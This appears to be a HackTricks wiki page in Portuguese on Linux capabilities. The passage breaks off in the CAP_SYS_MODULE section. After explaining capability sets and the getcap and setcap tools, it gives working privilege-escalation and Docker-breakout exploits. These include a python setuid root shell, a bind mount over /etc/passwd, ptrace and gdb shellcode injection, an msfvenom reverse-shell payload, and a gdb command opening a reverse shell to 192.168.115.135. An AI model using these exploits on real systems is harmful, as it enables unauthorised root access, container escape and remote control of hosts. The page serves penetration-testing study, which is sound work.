# Linux Capabilities

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

As capacidades do Linux dividem os **privilégios de root em unidades menores e distintas**, permitindo que processos tenham um subconjunto de privilégios. Isso minimiza os riscos ao não conceder privilégios de root completos desnecessariamente.

### O Problema:

* Usuários normais têm permissões limitadas, afetando tarefas como abrir um soquete de rede que requer acesso de root.

### Conjuntos de Capacidades:

1. **Herdado (CapInh)**:

* **Propósito**: Determina as capacidades transmitidas pelo processo pai.
* **Funcionalidade**: Quando um novo processo é criado, ele herda as capacidades de seu pai neste conjunto. Útil para manter certos privilégios em spawns de processos.
* **Restrições**: Um processo não pode adquirir capacidades que seu pai não possuía.

2. **Efetivo (CapEff)**:

* **Propósito**: Representa as capacidades reais que um processo está utilizando a qualquer momento.
* **Funcionalidade**: É o conjunto de capacidades verificado pelo kernel para conceder permissão para várias operações. Para arquivos, este conjunto pode ser uma flag indicando se as capacidades permitidas do arquivo devem ser consideradas efetivas.
* **Significado**: O conjunto efetivo é crucial para verificações imediatas de privilégio, atuando como o conjunto ativo de capacidades que um processo pode usar.

3. **Permitido (CapPrm)**:

* **Propósito**: Define o conjunto máximo de capacidades que um processo pode possuir.
* **Funcionalidade**: Um processo pode elevar uma capacidade do conjunto permitido para seu conjunto efetivo, dando-lhe a capacidade de usar essa capacidade. Também pode descartar capacidades de seu conjunto permitido.
* **Limite**: Age como um limite superior para as capacidades que um processo pode ter, garantindo que um processo não exceda seu escopo de privilégio predefinido.

4. **Limitação (CapBnd)**:

* **Propósito**: Coloca um teto nas capacidades que um processo pode adquirir durante seu ciclo de vida.
* **Funcionalidade**: Mesmo que um processo tenha uma determinada capacidade em seu conjunto herdado ou permitido, ele não pode adquirir essa capacidade a menos que também esteja no conjunto de limitação.
* **Caso de uso**: Este conjunto é particularmente útil para restringir o potencial de escalonamento de privilégios de um processo, adicionando uma camada extra de segurança.

5. **Ambiente (CapAmb)**:

* **Propósito**: Permite que certas capacidades sejam mantidas através de uma chamada de sistema `execve`, que normalmente resultaria em uma reinicialização completa das capacidades do processo.
* **Funcionalidade**: Garante que programas não-SUID que não têm capacidades de arquivo associadas possam reter certos privilégios.
* **Restrições**: As capacidades neste conjunto estão sujeitas às restrições dos conjuntos herdado e permitido, garantindo que não excedam os privilégios permitidos do processo.

```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```

Para mais informações, consulte:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capacidades de Processos e Binários

### Capacidades de Processos

Para ver as capacidades de um processo específico, use o arquivo **status** no diretório /proc. Como ele fornece mais detalhes, vamos limitá-lo apenas às informações relacionadas às capacidades do Linux.\
Observe que para todos os processos em execução, as informações de capacidade são mantidas por thread e, para binários no sistema de arquivos, são armazenadas em atributos estendidos.

Você pode encontrar as capacidades definidas em /usr/include/linux/capability.h

Você pode encontrar as capacidades do processo atual em `cat /proc/self/status` ou usando `capsh --print` e de outros usuários em `/proc/<pid>/status`

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Este comando deve retornar 5 linhas na maioria dos sistemas.

* CapInh = Capacidades herdadas
* CapPrm = Capacidades permitidas
* CapEff = Capacidades efetivas
* CapBnd = Conjunto delimitador
* CapAmb = Conjunto de capacidades ambientes

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Estes números hexadecimais não fazem sentido. Usando a utilidade capsh podemos decodificá-los para o nome das capacidades.

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Vamos verificar agora as **capacidades** usadas pelo `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Embora isso funcione, há outra maneira mais fácil. Para ver as capacidades de um processo em execução, basta usar a ferramenta **getpcaps** seguida pelo seu ID de processo (PID). Você também pode fornecer uma lista de IDs de processo.

```bash
getpcaps 1234
```

Vamos verificar aqui as capacidades do `tcpdump` depois de ter dado ao binário capacidades suficientes (`cap_net_admin` e `cap_net_raw`) para capturar o tráfego de rede (_tcpdump está sendo executado no processo 9562_):

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Como você pode ver, as capacidades fornecidas correspondem aos resultados das 2 maneiras de obter as capacidades de um binário.\
A ferramenta _getpcaps_ utiliza a chamada de sistema **capget()** para consultar as capacidades disponíveis para uma thread específica. Esta chamada de sistema só precisa fornecer o PID para obter mais informações.

### Capacidades de Binários

Os binários podem ter capacidades que podem ser usadas durante a execução. Por exemplo, é muito comum encontrar o binário `ping` com a capacidade `cap_net_raw`:

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Você pode **pesquisar binários com capacidades** usando:

```bash
getcap -r / 2>/dev/null
```

### Descartando capacidades com capsh

Se descartarmos as capacidades CAP\_NET\_RAW para o _ping_, então o utilitário ping não deverá mais funcionar.

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Além da saída do _capsh_ em si, o comando _tcpdump_ também deve gerar um erro.

> /bin/bash: /usr/sbin/tcpdump: Operação não permitida

O erro claramente mostra que o comando ping não está autorizado a abrir um soquete ICMP. Agora sabemos com certeza que isso funciona conforme o esperado.

### Remover Capacidades

Você pode remover as capacidades de um binário com

```bash
setcap -r </path/to/binary>
```

## Capacidades do Usuário

Aparentemente **é possível atribuir capacidades também aos usuários**. Isso provavelmente significa que todo processo executado pelo usuário poderá usar as capacidades do usuário.\
Com base [nisto](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [isto](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)e [isto](https://stackoverflow.com/questions/1956732-is-it-possible-to-configure-linux-capabilities-per-user) alguns arquivos novos precisam ser configurados para dar a um usuário determinadas capacidades, mas aquele que atribui as capacidades a cada usuário será `/etc/security/capability.conf`.\
Exemplo de arquivo:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Capacidades do Ambiente

Compilando o seguinte programa, é possível **iniciar um shell bash dentro de um ambiente que fornece capacidades**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Dentro do **bash executado pelo binário de ambiente compilado** é possível observar as **novas capacidades** (um usuário comum não terá nenhuma capacidade na seção "current").

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

{% hint style="danger" %}
Você só pode **adicionar capacidades que estão presentes** nos conjuntos permitidos e herdados.
{% endhint %}

### Binários Conscientes de Capacidades / Binários Ignorantes de Capacidades

Os **binários conscientes de capacidades não usarão as novas capacidades** fornecidas pelo ambiente, no entanto, os **binários ignorantes de capacidades as usarão**, pois não as rejeitarão. Isso torna os binários ignorantes de capacidades vulneráveis dentro de um ambiente especial que concede capacidades aos binários.

## Capacidades de Serviço

Por padrão, um **serviço em execução como root terá atribuídas todas as capacidades**, e em algumas ocasiões isso pode ser perigoso.\
Portanto, um arquivo de **configuração de serviço** permite **especificar** as **capacidades** que você deseja que ele tenha, **e** o **usuário** que deve executar o serviço para evitar executar um serviço com privilégios desnecessários:

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Capacidades em Contêineres Docker

Por padrão, o Docker atribui algumas capacidades aos contêineres. É muito fácil verificar quais são essas capacidades executando:

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

As capacidades são úteis quando você **deseja restringir seus próprios processos após realizar operações privilegiadas** (por exemplo, após configurar chroot e vincular a um soquete). No entanto, elas podem ser exploradas passando comandos ou argumentos maliciosos que são então executados como root.

Você pode forçar capacidades em programas usando `setcap` e consultar essas capacidades usando `getcap`:

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

O `+ep` significa que você está adicionando a capacidade ("-" a removeria) como Eficaz e Permitida.

Para identificar programas em um sistema ou pasta com capacidades:

```bash
getcap -r / 2>/dev/null
```

### Exemplo de exploração

No exemplo a seguir, o binário `/usr/bin/python2.6` é encontrado vulnerável à escalada de privilégios:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capacidades** necessárias pelo `tcpdump` para **permitir que qualquer usuário capture pacotes**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### O caso especial das capacidades "vazias"

[Da documentação](https://man7.org/linux/man-pages/man7/capabilities.7.html): Note que é possível atribuir conjuntos de capacidades vazios a um arquivo de programa, tornando possível criar um programa com set-user-ID-root que altera o set-user-ID efetivo e salvo do processo que executa o programa para 0, mas não confere nenhuma capacidade a esse processo. Ou, em outras palavras, se você tiver um binário que:

1. não é de propriedade do root
2. não possui bits `SUID`/`SGID` definidos
3. possui um conjunto de capacidades vazio (por exemplo: `getcap myelf` retorna `myelf =ep`)

então **esse binário será executado como root**.

## CAP\_SYS\_ADMIN

[**`CAP_SYS_ADMIN`**](https://man7.org/linux/man-pages/man7/capabilities.7.html) é uma capacidade Linux altamente potente, frequentemente equiparada a um nível quase root devido aos seus extensos **privilégios administrativos**, como montar dispositivos ou manipular recursos do kernel. Embora essencial para contêineres que simulam sistemas inteiros, **`CAP_SYS_ADMIN` apresenta desafios significativos de segurança**, especialmente em ambientes contêinerizados, devido ao seu potencial de escalonamento de privilégios e comprometimento do sistema. Portanto, seu uso requer avaliações rigorosas de segurança e gerenciamento cauteloso, com uma forte preferência por descartar essa capacidade em contêineres específicos de aplicativos para aderir ao **princípio do menor privilégio** e minimizar a superfície de ataque.

**Exemplo com binário**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Usando python, você pode montar um arquivo _passwd_ modificado em cima do arquivo _passwd_ real:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

E finalmente **monte** o arquivo `passwd` modificado em `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

E você será capaz de **`su` como root** usando a senha "password".

**Exemplo com ambiente (Docker breakout)**

Você pode verificar as capacidades habilitadas dentro do contêiner Docker usando:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Dentro da saída anterior, você pode ver que a capacidade SYS\_ADMIN está habilitada.

* **Montagem**

Isso permite que o contêiner docker **monte o disco do host e acesse-o livremente**:

```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```

* **Acesso total**

No método anterior, conseguimos acessar o disco do host do docker.\
Caso você descubra que o host está executando um servidor **ssh**, você poderia **criar um usuário dentro do disco do host do docker** e acessá-lo via SSH:

```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```

## CAP\_SYS\_PTRACE

**Isso significa que você pode escapar do contêiner injetando um shellcode dentro de algum processo em execução dentro do host.** Para acessar processos em execução dentro do host, o contêiner precisa ser executado pelo menos com **`--pid=host`**.

[**`CAP_SYS_PTRACE`**](https://man7.org/linux/man-pages/man7/capabilities.7.html) concede a capacidade de usar funcionalidades de rastreamento de chamadas de sistema e depuração fornecidas por `ptrace(2)` e chamadas de anexo de memória cruzada como `process_vm_readv(2)` e `process_vm_writev(2)`. Embora seja poderoso para fins de diagnóstico e monitoramento, se `CAP_SYS_PTRACE` estiver habilitado sem medidas restritivas como um filtro seccomp em `ptrace(2)`, ele pode minar significativamente a segurança do sistema. Especificamente, pode ser explorado para contornar outras restrições de segurança, especialmente aquelas impostas pelo seccomp, como demonstrado por [provas de conceito (PoC) como esta](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Exemplo com binário (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Exemplo com binário (gdb)**

`gdb` com a capacidade `ptrace`:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Crie um shellcode com msfvenom para injetar na memória via gdb

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```

Depurar um processo raiz com gdb e copiar e colar as linhas do gdb geradas anteriormente:

```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Exemplo com ambiente (Docker breakout) - Outro Abuso do gdb**

Se o **GDB** estiver instalado (ou você pode instalá-lo com `apk add gdb` ou `apt install gdb`, por exemplo), você pode **depurar um processo do host** e fazê-lo chamar a função `system`. (Essa técnica também requer a capacidade `SYS_ADMIN`).

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Não será possível ver a saída do comando executado, mas ele será executado por esse processo (então obtenha um shell reverso).

{% hint style="warning" %}
Se você receber o erro "No symbol "system" in current context.", verifique o exemplo anterior carregando um shellcode em um programa via gdb.
{% endhint %}

**Exemplo com ambiente (Docker breakout) - Injeção de Shellcode**

Você pode verificar as capacidades habilitadas dentro do contêiner Docker usando:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Listar **processos** em execução no **host** `ps -eaf`

1. Obter a **arquitetura** `uname -m`
2. Encontrar um **shellcode** para a arquitetura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Encontrar um **programa** para **injetar** o **shellcode** na memória de um processo ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Modificar** o **shellcode** dentro do programa e **compilá-lo** `gcc inject.c -o inject`
5. **Injetá-lo** e obter seu **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

[**`CAP_SYS_MODULE`**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capacita um processo a **carregar e descarregar módulos do kernel (chamadas de sistema `init_module(2)`, `finit_module(2)` e `delete_module(2)`)**, oferecendo acesso direto às operações centrais do kernel. Essa capacidade apresenta riscos críticos de segurança, pois permite escalonamento de privilégios e comprometimento total do sistema ao permitir modificações no kernel, contornando todos os mecanismos de segurança do Linux, incluindo Módulos de Segurança do Linux e isolamento de contêineres. **Isso significa que você pode** **inserir/remover módulos do kernel no da máquina host.**

**Exemplo com binário**

No exemplo a seguir, o binário **`python`** possui essa capacidade.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Por padrão, o comando **`modprobe`** verifica a lista de dependências e arquivos de mapeamento no diretório **`/lib/modules/$(uname -r)`**.\
Para abusar disso, vamos criar uma pasta falsa **lib/modules**:

```bash
mkdir lib/modules -p
